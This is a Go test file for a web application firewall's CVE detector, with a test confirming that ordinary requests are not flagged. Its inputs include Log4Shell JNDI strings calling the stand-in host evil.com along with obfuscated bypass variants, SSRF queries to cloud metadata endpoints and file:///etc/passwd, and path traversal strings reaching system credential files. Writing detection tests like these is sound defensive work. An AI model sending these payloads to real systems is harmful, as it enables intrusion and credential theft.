package waf

import (
	"testing"
)

func TestCVEDetector_PHPDeserialization(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name    string
		body    string
		wantCVE string
	}{
		{"serialized object", `O:8:"stdClass":1:{s:4:"test";s:5:"value";}`, "CVE-2015-6835"},
		{"serialized array", `a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}`, "CVE-2015-6835"},
		{"unserialize call", `data=unserialize($_GET['input'])`, "CVE-2015-6835"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/", "", nil, []byte(tt.body), "application/x-www-form-urlencoded")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == tt.wantCVE {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected CVE %s to be detected for input %q", tt.wantCVE, tt.body)
			}
		})
	}
}

func TestCVEDetector_Log4Shell(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name  string
		input string
	}{
		{"basic jndi ldap", "${jndi:ldap://evil.com/a}"},
		{"basic jndi rmi", "${jndi:rmi://evil.com/a}"},
		{"bypass nested lower", "${${lower:j}ndi:ldap://evil.com/a}"},
		{"bypass j-n split", "${j${::-n}di:ldap://evil.com/a}"},
		{"bypass jn-d split", "${jn${::-d}i:ldap://evil.com/a}"},
		{"url encoded", "%24%7Bjndi:ldap://evil.com/a%7D"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/", "x="+tt.input, nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2021-44228" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("Log4Shell not detected for: %s", tt.input)
			}
		})
	}
}

func TestCVEDetector_SSRF(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name  string
		query string
	}{
		{"internal 10.x", "url=http://10.0.0.1/admin"},
		{"internal 172.16", "url=http://172.16.0.1/secret"},
		{"internal 192.168", "url=http://192.168.1.1/config"},
		{"localhost", "url=http://localhost/admin"},
		{"127.0.0.1", "url=http://127.0.0.1/secret"},
		{"cloud metadata", "url=http://169.254.169.254/latest/meta-data/"},
		{"gcloud metadata", "url=http://metadata.google.internal/computeMetadata/v1/"},
		{"file protocol", "url=file:///etc/passwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest("/fetch", tt.query, nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2019-SSRF" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("SSRF not detected for query: %s", tt.query)
			}
		})
	}
}

func TestCVEDetector_CategorySensitivity_OffDisablesGeneralDetector(t *testing.T) {
	d := NewCVEDetector()
	req := BuildCVERequest("/fetch", "url=http://169.254.169.254/latest/meta-data/", nil, nil, "")
	matches := d.Detect(req, map[string]string{"cve_general": "off"})
	for _, m := range matches {
		if m.CVEID == "CVE-2019-SSRF" {
			t.Fatalf("expected cve_general to be disabled, got %+v", matches)
		}
	}
}

func TestCVEDetector_PathTraversal(t *testing.T) {
	d := NewCVEDetector()

	tests := []struct {
		name string
		path string
	}{
		{"double encoded", "/files/%252e%252e%252f%252e%252e%252fetc/passwd"},
		{"windows backslash", "/files/..\\..\\windows\\system32\\config\\sam"},
		{"encoded backslash", "/files/..%5c..%5cwindows"},
		{"null byte", "/files/../../%00"},
		{"quad dot", "/files/....//etc/passwd"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := BuildCVERequest(tt.path, "", nil, nil, "")
			matches := d.Detect(req)
			found := false
			for _, m := range matches {
				if m.CVEID == "CVE-2019-PATHTRA" {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("path traversal not detected for: %s", tt.path)
			}
		})
	}
}

func TestCVEDetector_NoFalsePositive(t *testing.T) {
	d := NewCVEDetector()

	// Normal requests should not trigger CVE detection
	normalRequests := []struct {
		name  string
		path  string
		query string
		body  string
	}{
		{"simple GET", "/api/users", "page=1&limit=10", ""},
		{"json POST", "/api/login", "", `{"username":"admin","password":"test123"}`},
		{"static file", "/assets/main.css", "", ""},
	}

	for _, tt := range normalRequests {
		t.Run(tt.name, func(t *testing.T) {
			var bodyBytes []byte
			if tt.body != "" {
				bodyBytes = []byte(tt.body)
			}
			req := BuildCVERequest(tt.path, tt.query, nil, bodyBytes, "application/json")
			matches := d.Detect(req)
			if len(matches) > 0 {
				t.Errorf("false positive on normal request %q: got %d matches: %v", tt.name, len(matches), matches[0].CVEID)
			}
		})
	}
}
